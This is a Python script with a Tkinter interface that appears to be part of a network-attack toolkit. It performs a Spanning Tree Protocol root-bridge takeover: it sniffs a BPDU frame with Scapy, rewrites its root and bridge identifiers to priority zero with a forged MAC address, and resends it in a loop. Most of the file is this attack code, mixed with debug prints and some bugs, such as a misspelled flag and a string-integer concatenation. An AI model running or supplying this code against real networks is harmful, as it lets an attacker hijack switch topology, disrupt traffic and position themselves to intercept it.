from scapy.all import *
from scapy.layers.l2 import Ether, Dot1Q, Dot3, LLC, STP

from tkinter import *

def startStp(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
    global stpIsRunning, stpThreads, terminalLabel, wiresharkLabel, errorOutputLabel

    stpIsRunning = False
    stpThreads = threading.Thread(target = lambda : stpLoop())

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    wiresharkLabel.configure(bg = colorConfig)
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Running STP Attack...\n\n"

    runStpAttack()

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopStp() :
    global stpThreads, stpIsRunning

    try:
        terminalLabel["text"] += "\n$ Stopping STP Attack...\n\n"
        stpIsrunning = False
        stpThreads.join(0)
        stpThreads = None

        terminalLabel["text"] += "$ STP Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"

def runStpAttack() :
    global stpThreads, stpIsRunning
    stpIsRunning = True
    terminalLabel["text"] += "$ (TEST) Activating Threads\n\n"
    stpThreads.start()

def stpLoop() :
    perform_stp_attack()
    '''
    try :
        while stpIsRunning == True :
            terminalLabel["text"] += "$ [1] Sending packets... (On Loop)\n\n"
            perform_stp_attack()
            terminalLabel["text"] += "$ [2] Sending packets... (On Loop)\n\n"
            time.sleep(2)

        if stpIsRunning == False :
            print("\n\n IT HAS STOPPED \n\n")
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
    '''

def perform_stp_attack():
    terminalLabel["text"] += "$ (TEST) Performing Attack\n\n"
    interface = "eth0"

    # Enable promiscuous mode on the interface
    # subprocess.call(["ifconfig", interface, "promisc"])

    terminalLabel["text"] += "$ (TEST) Subprocess 1\n\n"

    # Send STP BPDU (Bridge Protocol Data Unit) packets
    send_stp_bpdu(interface)

    terminalLabel["text"] += "$ (TEST) Sent Packets\n\n"

    # Disable promiscuous mode on the interface
    # subprocess.call(["ifconfig", interface, "-promisc"])

    terminalLabel["text"] += "$ (TEST) Subprocess 2\n\n"

def send_stp_bpdu(interface):
    '''
    terminalLabel["text"] += "$ (TEST) In BDPU Function\n\n"
    dst_mac = "01:80:c2:00:00:00"  # Destination MAC address for STP BPDU packets
    terminalLabel["text"] += "$ (TEST) Check Check\n\n"
    stp_bpdu = Ether(dst=dst_mac)/Dot3()/LLC()/STP(bpdutype=0x00)/Raw(load="\x00"*46)
    terminalLabel["text"] += "$ (TEST) Crafted BDPU Packet\n\n"
    sendp(stp_bpdu, "eth0", loop=1, inter=2, verbose=False)
    terminalLabel["text"] += "$ (TEST) After BDPU Function\n\n"
    '''
    print("1")
    packet = sniff(filter="ether dst 01:80:c2:00:00:00", count=1)
    
    packet[0].src = "00:00:00:00:00:01"
    packet[0].rootid = 0
    packet[0].rootmac = "00:00:00:00:00:01"
    packet[0].bridgeid = 0
    packet[0].bridgemac = "00:00:00:00:00:01"

    print("2")

    send_packet_loop(packet)
    print("6")

def send_packet_loop(packet) :
    print("3")
    for i in range (0, 50) :
        print("4 - Loop " + i)
        packet[0].show()
        sendp(packet[0], Loop = 0, verbose = 1)
        time.sleep(1)
    
    print("5")